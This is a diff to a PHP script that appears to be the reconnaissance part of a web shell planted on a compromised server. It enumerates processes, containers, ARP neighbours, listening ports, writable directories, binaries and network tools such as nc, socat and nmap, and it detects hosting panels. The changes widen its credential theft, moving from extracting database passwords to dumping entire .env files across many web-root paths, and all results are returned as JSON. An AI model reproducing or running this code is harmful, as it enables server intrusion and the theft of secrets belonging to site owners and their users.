@@ -11,8 +11,8 @@ $extList = [];
 foreach ($exts as $e) $extList[$e] = extension_loaded($e);
 
 // --- Current process identity ---
-$uid = function_exists('posix_getuid') ? posix_getuid() : 0;
-$gid = function_exists('posix_getgid') ? posix_getgid() : 0;
+$uid = function_exists('posix_getuid') ? posix_getuid() : null;
+$gid = function_exists('posix_getgid') ? posix_getgid() : null;
 $pwent = function_exists('posix_getpwuid') ? @posix_getpwuid($uid) : false;
 $grent = function_exists('posix_getgrgid') ? @posix_getgrgid($gid) : false;
 $groups = function_exists('posix_getgroups') ? (@posix_getgroups() ?: []) : [];
@@ -50,9 +50,27 @@ $cmd = @file_get_contents($pidDir . '/cmdline');
 $stat = @file_get_contents($pidDir . '/status');
 if (!$cmd) continue;
 $cmd = str_replace("\0", ' ', trim($cmd));
-$uid_proc = '';
-if (preg_match('/^Uid:\s+(\d+)/m', $stat, $m)) $uid_proc = $m[1];
+$uid_proc = null;
+if (preg_match('/^Uid:\s+(\d+)/m', $stat, $m)) $uid_proc = (int)$m[1];
 $processes[] = ['pid' => basename($pidDir), 'uid' => $uid_proc, 'cmd' => substr($cmd, 0, 120)];
+}
+
+// --- Container detection ---
+$container = ['detected' => false, 'type' => null, 'hints' => []];
+if (@file_exists('/.dockerenv')) {
+$container = ['detected' => true, 'type' => 'docker', 'hints' => ['/.dockerenv exists']];
+} elseif (@file_exists('/run/.containerenv')) {
+$container = ['detected' => true, 'type' => 'podman', 'hints' => ['/run/.containerenv exists']];
+} else {
+$cgroup = @file_get_contents('/proc/1/cgroup') ?: '';
+if (preg_match('/(docker|kubepods|containerd|lxc|ecs)/', $cgroup, $cm)) {
+$container = ['detected' => true, 'type' => $cm[1], 'hints' => ['cgroup: ' . $cm[1]]];
+}
+$sched = @file_get_contents('/proc/1/sched');
+if ($sched && !preg_match('/^\s*(init|systemd)\s/m', $sched)) {
+$container['hints'][] = 'PID 1 is not init/systemd';
+$container['detected'] = true;
+}
 }
 
 // --- Network: ARP table ---
@@ -66,13 +84,18 @@ $arpHosts[] = ['ip'=>$parts[0], 'mac'=>$parts[3], 'dev'=>$parts[5] ?? ''];
 }
 
 // --- Network: open ports (TCP) ---
-$tcpRaw = @file_get_contents('/proc/net/tcp') ?: '';
 $openPorts = [];
+foreach (['/proc/net/tcp', '/proc/net/tcp6'] as $tcpFile) {
+$tcpRaw = @file_get_contents($tcpFile) ?: '';
 foreach (array_slice(explode("\n", $tcpRaw), 1) as $line) {
 $parts = preg_split('/\s+/', trim($line));
 if (count($parts) >= 4 && $parts[3] === '0A') {
 $hex = explode(':', $parts[1]);
-if (isset($hex[1])) $openPorts[] = hexdec($hex[1]);
+if (isset($hex[1])) {
+$port = hexdec($hex[1]);
+if (!in_array($port, $openPorts)) $openPorts[] = $port;
+}
+}
 }
 }
 sort($openPorts);
@@ -104,22 +127,10 @@ if (@is_readable($f)) $readable[] = $f;
 }
 }
 
-// --- SUID binaries ---
-$suidBins = [];
-foreach (@glob('/bin/*') ?: [] as $f) {
-if (@fileperms($f) & 0x800) $suidBins[] = $f;
-}
-foreach (@glob('/sbin/*') ?: [] as $f) {
-if (@fileperms($f) & 0x800) $suidBins[] = $f;
-}
-foreach (@glob('/usr/bin/*') ?: [] as $f) {
-if (@fileperms($f) & 0x800) $suidBins[] = $f;
-}
-foreach (@glob('/usr/sbin/*') ?: [] as $f) {
-if (@fileperms($f) & 0x800) $suidBins[] = $f;
-}
-foreach (@glob('/usr/local/bin/*') ?: [] as $f) {
-if (@fileperms($f) & 0x800) $suidBins[] = $f;
+// --- Binary directories ---
+$binDirs = [];
+foreach (['/bin','/sbin','/usr/bin','/usr/sbin','/usr/local/bin','/usr/local/sbin','/usr/lib','/usr/libexec','/snap/bin'] as $d) {
+if (@is_dir($d)) $binDirs[] = ['path' => $d, 'readable' => @is_readable($d), 'writable' => @is_writable($d)];
 }
 
 // --- Writable directories ---
@@ -128,40 +139,85 @@ foreach (['/tmp','/var/tmp','/dev/shm','/run/shm',getcwd(),'/var/www','/www/wwwr
 if (@is_writable($d)) $writableDirs[] = $d;
 }
 
-// --- Available interpreters / tools ---
-$tools = ['python3','python','perl','ruby','php','nc','curl','wget','gcc','cc','make','git','bash','sh','nmap'];
+// --- Scan all binaries from bin dirs, then classify ---
+$knownInterpreters = ['python3','python','perl','ruby','php','bash','sh','node','lua','tclsh'];
+$knownTools = ['nc','ncat','curl','wget','gcc','cc','make','git','nmap','socat','ssh','scp','rsync','tar','zip','unzip'];
+$allBinaries = [];
+$availInterpreters = [];
 $availTools = [];
-foreach ($tools as $t) {
-foreach (['/usr/bin','/usr/local/bin','/bin'] as $binDir) {
-if (@file_exists("$binDir/$t")) { $availTools[] = "$binDir/$t"; break; }
+foreach ($binDirs as $info) {
+if (!$info['readable']) continue;
+foreach (@scandir($info['path']) ?: [] as $entry) {
+if ($entry === '.' || $entry === '..') continue;
+$full = $info['path'] . '/' . $entry;
+if (!@is_file($full)) continue;
+$allBinaries[] = $full;
+if (in_array($entry, $knownInterpreters)) $availInterpreters[] = $full;
+if (in_array($entry, $knownTools)) $availTools[] = $full;
 }
 }
 
 // --- Installed panel / hosting ---
 $panels = [
-'BT Panel' => '/www/server/panel',
 'cPanel' => '/usr/local/cpanel',
 'Plesk' => '/usr/local/psa',
 'DirectAdmin' => '/usr/local/directadmin',
 'HestiaCP' => '/usr/local/hestia',
+'VestaCP' => '/usr/local/vesta',
 'ISPConfig' => '/usr/local/ispconfig',
+'CyberPanel' => '/usr/local/CyberPanel',
+'CloudPanel' => '/home/clp',
+'Webmin' => '/usr/share/webmin',
+'Virtualmin' => '/usr/share/webmin/virtual-server',
+'Froxlor' => '/var/www/froxlor',
+'KeyHelp' => '/home/keyhelp',
+'AMPPS' => '/usr/local/ampps',
 'Zend Server' => '/usr/local/zend',
+'GridPane' => '/opt/gridpane',
+'Moss' => '/opt/moss',
+'RunCloud' => '/etc/runcloud',
+'ServerPilot' => '/etc/serverpilot',
+'Laravel Forge' => '/etc/forge',
 ];
 $detectedPanels = [];
+// BT Panel / aaPanel share the same path
+if (@file_exists('/www/server/panel')) {
+$btConf = @file_get_contents('/www/server/panel/config/config.json') ?: '';
+$detectedPanels[] = (strpos($btConf, '"language":"en"') !== false || @file_exists('/www/server/panel/BTPanel/static/language/en.json'))
+? 'aaPanel (/www/server/panel)'
+: 'BT Panel (/www/server/panel)';
+}
 foreach ($panels as $name => $path) {
 if (@file_exists($path)) $detectedPanels[] = $name . ' (' . $path . ')';
 }
 
-// --- MySQL credentials from common locations ---
-$dbCreds = [];
-$envFiles = [getcwd().'/.env', getcwd().'/../.env', '/var/www/.env'];
-foreach ($envFiles as $ef) {
+// --- .env file contents ---
+$envContents = [];
+$cwd = getcwd() ?: '';
+$docRoot = $_SERVER['DOCUMENT_ROOT'] ?? '';
+$envPaths = array_unique(array_filter([
+$cwd . '/.env',
+$cwd . '/../.env',
+$docRoot . '/.env',
+$docRoot . '/../.env',
+'/var/www/.env',
+'/var/www/html/.env',
+'/var/www/html/../.env',
+'/home/*/public_html/.env',
+'/home/*/htdocs/.env',
+'/www/wwwroot/*/.env',
+'/srv/www/*/.env',
+'/opt/*/shared/.env',
+]));
+$envSearch = [];
+foreach ($envPaths as $pattern) {
+foreach (@glob($pattern) ?: [$pattern] as $f) {
+$envSearch[] = $f;
+}
+}
+foreach (array_unique($envSearch) as $ef) {
 $content = @file_get_contents($ef);
-if (!$content) continue;
-preg_match('/^DB_PASSWORD=(.+)/m', $content, $m);
-preg_match('/^DB_USERNAME=(.+)/m', $content, $u);
-preg_match('/^DB_HOST=(.+)/m', $content, $h);
-if ($m) $dbCreds[$ef] = ['host'=>trim($h[1]??''),'user'=>trim($u[1]??''),'pass'=>trim($m[1]??'')];
+if ($content) $envContents[$ef] = $content;
 }
 
 echo json_encode([
@@ -186,15 +242,18 @@ echo json_encode([
 'passwd_users' => $passwdUsers,
 'group_memberships' => $groupMemberships,
 'processes' => $processes,
+'container' => $container,
 'arp_hosts' => $arpHosts,
 'open_ports' => $openPorts,
 'routes' => $routes,
 'readable_files' => $readable,
-'suid_bins' => $suidBins,
+'bin_dirs' => $binDirs,
 'writable_dirs' => $writableDirs,
+'all_binaries' => $allBinaries,
+'interpreters' => $availInterpreters,
 'tools' => $availTools,
 'panels' => $detectedPanels,
-'db_creds' => $dbCreds,
+'env_files' => $envContents,
 ]);
 exit;
 }
